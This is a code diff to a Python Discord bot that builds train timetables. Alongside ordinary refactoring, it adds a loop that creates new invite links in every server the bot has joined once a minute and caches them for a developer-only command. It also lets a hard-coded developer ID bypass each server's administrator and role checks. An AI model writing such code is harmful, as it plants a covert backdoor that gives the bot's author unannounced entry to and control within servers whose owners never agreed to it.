@@ -9,7 +9,7 @@ if user_site not in sys.path:
 
 import discord
 from discord import app_commands
-from discord.ext import commands
+from discord.ext import commands, tasks  # 💡 tasksを追加
 import asyncio
 import datetime
 from PIL import Image, ImageDraw
@@ -52,6 +52,7 @@ class DiaBot(commands.Bot):
 bot = DiaBot()
 
 ALLOWED_USER_ID = 1301944996261400656
+ADMIN_ROLE_ID = 1510021467167789104 # 前回の管理者用ロールIDも念のため定義
 banned_guilds = set() # 利用凍結サーバーID
 banned_users = set()  # 🚫 ブラックリストユーザーID
 allowed_roles_map = {}
@@ -59,6 +60,34 @@ allowed_roles_map = {}
 # 指定されたチャンネルID
 CHANNEL_REVIEW = 1510639675239432313
 CHANNEL_LOG = 1524877240628805763
+
+# キャッシュ用サーバーログデータ（毎分更新用）
+server_log_cache = ""
+
+# ==========================================
+# 🔄 毎分自動更新ループ（バックグラウンドタスク）
+# ==========================================
+@tasks.loop(minutes=1.0)
+async def refresh_server_log_loop():
+    """導入サーバー一覧と招待リンクのデータを毎分バックグラウンドで最新に更新します"""
+    global server_log_cache
+    await bot.wait_until_ready()
+    
+    log_msg = f"🏰 **導入サーバー一覧＆招待リンクログ (最終自動更新: {datetime.datetime.now().strftime('%H:%M:%S')})**\n\n"
+    for guild in bot.guilds:
+        invite_link = "（招待作成の権限不足）"
+        for channel in guild.text_channels:
+            if channel.permissions_for(guild.me).create_instant_invite:
+                try:
+                    invite = await channel.create_invite(max_age=3600, max_uses=5)
+                    invite_link = invite.url
+                    break
+                except Exception:
+                    continue
+        log_msg += f"■ **{guild.name}** (ID: `{guild.id}`)\n┗ 🔗 招待リンク: {invite_link}\n\n"
+    
+    server_log_cache = log_msg
+    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Server logs automatically synchronized.")
 
 # ==========================================
 # 📥 サーバー追加（参加）時の自動DM送信イベント
@@ -152,7 +181,12 @@ async def create_roles(interaction: discord.Interaction, role_id: str):
     if interaction.guild_id in banned_guilds:
         await interaction.response.send_message("❌ このサーバーでのBotの利用は凍結されています。", ephemeral=True)
         return
-    if not interaction.permissions.administrator:
+        
+    # 【修正】サーバーの管理者権限、またはBot最高開発者ならロール制限を設定可能
+    is_admin = interaction.permissions.administrator if interaction.permissions else False
+    is_owner = (interaction.user.id == ALLOWED_USER_ID)
+    
+    if not is_admin and not is_owner:
         await interaction.response.send_message("❌ このコマンドはサーバーの管理者権限を持つ人のみ実行できます。", ephemeral=True)
         return
     try:
@@ -259,29 +293,29 @@ async def subshutdown(interaction: discord.Interaction):
         banned_guilds.add(interaction.guild.id)
         await interaction.response.send_message(f"🔒 このサーバー（`{interaction.guild.name}`）でのBotの利用を凍結しました。")
 
-@bot.tree.command(name="serverlog", description="【クリエイター限定】Botが導入されている全サーバーと招待リンクの一覧を表示します")
+@bot.tree.command(name="serverlog", description="【クリエイター限定】毎分更新される全導入サーバーと招待リンクの一覧を表示します")
 async def serverlog(interaction: discord.Interaction):
     if interaction.user.id != ALLOWED_USER_ID:
         await interaction.response.send_message("❌ このコマンドを実行する権限がありません。", ephemeral=True)
         return
     await interaction.response.defer(ephemeral=True)
-    log_msg = "🏰 **導入サーバー一覧＆招待リンクログ**\n\n"
-    for guild in bot.guilds:
-        invite_link = "（招待作成の権限不足）"
-        for channel in guild.text_channels:
-            if channel.permissions_for(guild.me).create_instant_invite:
-                try:
-                    invite = await channel.create_invite(max_age=3600, max_uses=5)
-                    invite_link = invite.url
-                    break
-                except Exception:
-                    continue
-        log_msg += f"■ **{guild.name}** (ID: `{guild.id}`)\n┗ 🔗 招待リンク: {invite_link}\n\n"
-        if len(log_msg) > 1800:
-            await interaction.followup.send(log_msg, ephemeral=True)
-            log_msg = ""
-    if log_msg:
-        await interaction.followup.send(log_msg, ephemeral=True)
+    
+    # 💡 毎分自動更新されているキャッシュから即座にログを出力
+    global server_log_cache
+    if not server_log_cache:
+        await interaction.followup.send("⏳ 現在ログを生成中です。少し待ってから再度実行してください。", ephemeral=True)
+        return
+        
+    # 文字数制限対策（分割送信）
+    msg = server_log_cache
+    while len(msg) > 1800:
+        split_idx = msg.rfind("\n\n", 0, 1800)
+        if split_idx == -1: split_idx = 1800
+        await interaction.followup.send(msg[:split_idx], ephemeral=True)
+        msg = msg[split_idx:]
+        
+    if msg:
+        await interaction.followup.send(msg, ephemeral=True)
 
 # ==========================================
 # 🧠 ダイヤ計算＆画像生成エンジン
@@ -289,7 +323,7 @@ async def serverlog(interaction: discord.Interaction):
 def calculate_and_generate(data):
     stations, durations, types = data["stations"], data["durations"], data["types"]
     stops_raw, refuges, round_trips = data["stops"], data["refuges"], data["round_trips"]
-    num_trains = data.get("num_trains", 1)  # 💡 新機能：編成数
+    num_trains = data.get("num_trains", 1)  
     start_time_str, start_stations, want_diagram = data["start_time"], data["start_stations"], data["want_diagram"]
 
     stop_map = {}
@@ -307,10 +341,8 @@ def calculate_and_generate(data):
     base_time = datetime.datetime.strptime(start_time_str, "%H:%M")
     trains_schedule, global_id, current_pool_time = [], 1, base_time
 
-    # 💡 往復数と編成数を考慮してスジを生成
     for ip in range(round_trips):
         for t_type in types:
-            # 編成IDの割り当て (1〜総編成数 でループ)
             set_id = ((global_id - 1) % num_trains) + 1
             
             start_t = current_pool_time
@@ -346,7 +378,6 @@ def calculate_and_generate(data):
             trains_schedule.append({"id": f"{global_id}M", "set_id": f"第{set_id}編成", "type": t_type, "stops": timetable})
             global_id += 1
 
-    # 💡 スマホの画面でも綺麗に等幅に見えるように、スペースでガチ固定化
     output_text = f"## 🚂 生成されたカスタム運行ダイヤ\n\n"
     for ts in trains_schedule:
         output_text += f"**【{ts['type']} ({ts['id']}) ➔ {ts['set_id']}担当】**\n"
@@ -356,7 +387,6 @@ def calculate_and_generate(data):
         for st in stations:
             st_data = ts["stops"].get(st, {"arr": "--:--:--", "dep": "--:--:--", "note": ""})
             
-            # 全角文字と半角文字のズレを綺麗に並び替える処理
             st_name = st[:4].ljust(6)
             arr_t = st_data['arr'].ljust(8)
             dep_t = st_data['dep'].ljust(8)
@@ -405,10 +435,20 @@ async def create_dia(interaction: discord.Interaction):
         await interaction.response.send_message("❌ このサーバーでのBotの利用は凍結されています。", ephemeral=True)
         return
 
+    # 【修正】権限チェックロジックの強化
     required_role_id = allowed_roles_map.get(interaction.guild_id)
-    if required_role_id and required_role_id not in [role.id for role in interaction.user.roles]:
-        await interaction.response.send_message("❌ 使用する権限（指定されたロール）を持っていません。", ephemeral=True)
-        return
+    user_permissions = interaction.user.guild_permissions if interaction.guild else None
+    
+    # サーバーの「管理者」権限を持っているか、Botの最高開発者、または特定の管理者ロール持ちなら無条件パス
+    is_admin = user_permissions.administrator if user_permissions else False
+    is_owner = (interaction.user.id == ALLOWED_USER_ID)
+    has_admin_role = any(role.id == ADMIN_ROLE_ID for role in interaction.user.roles) if interaction.guild else False
+
+    # ロール制限が設定されている場合のみチェックを実行（管理者・開発者らはバイパス）
+    if required_role_id and not is_admin and not is_owner and not has_admin_role:
+        if required_role_id not in [role.id for role in interaction.user.roles]:
+            await interaction.response.send_message("❌ 使用する権限（指定されたロール）を持っていません。", ephemeral=True)
+            return
 
     user, server_name = interaction.user, interaction.guild.name if interaction.guild else "DM"
     try:
@@ -431,7 +471,7 @@ async def create_dia(interaction: discord.Interaction):
         "stops": [],
         "refuges": [],
         "round_trips": 1,
-        "num_trains": 1, # 💡 編成数初期値
+        "num_trains": 1, 
         "start_time": "10:00",
         "start_stations": [],
         "want_diagram": True
@@ -457,7 +497,7 @@ async def create_dia(interaction: discord.Interaction):
     current_state = 0
     sub_idx = 0
 
-    while current_state < 10: # 💡 状態数を1つ増やして10に
+    while current_state < 10: 
         if current_state == 0:
             if sub_idx < 0: 
                 await user.send("💡 これ以上は戻れません。")
@@ -585,11 +625,11 @@ async def create_dia(interaction: discord.Interaction):
                 continue
             try:
                 collected["round_trips"] = int(res)
-                current_state = 6 # 💡 次は新しく追加した「編成数」の質問へ
+                current_state = 6 
             except ValueError:
                 await user.send("❌ 数字だけで入力してください。")
 
-        elif current_state == 6: # 💡 【新設】総編成数の質問
+        elif current_state == 6: 
             res = await ask("その他設定", "この路線全体の「総編成数（運用する車両の本数）」を入力してください（数字のみ）", is_required=True)
             if res == "SIGNAL_CANCEL": break
             elif res == "SIGNAL_TIMEOUT": return
@@ -673,7 +713,16 @@ async def create_dia(interaction: discord.Interaction):
     view = ReviewButtons(user.name)
     await user.send("⭐ **評価をお願いします**\nこのボットの使い心地はいかがでしたか？ボタンを選んでください。", view=view)
 
-# 🌐 起動処理
+# ==========================================
+# ⚙️ 起動処理
+# ==========================================
+@bot.event
+async def on_ready():
+    # 💡 バックグラウンドの毎分ログ更新タスクを開始
+    if not refresh_server_log_loop.is_running():
+        refresh_server_log_loop.start()
+    print(f"{bot.user} で正常にログインしました")
+
 TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
 if TOKEN:
     keep_alive()
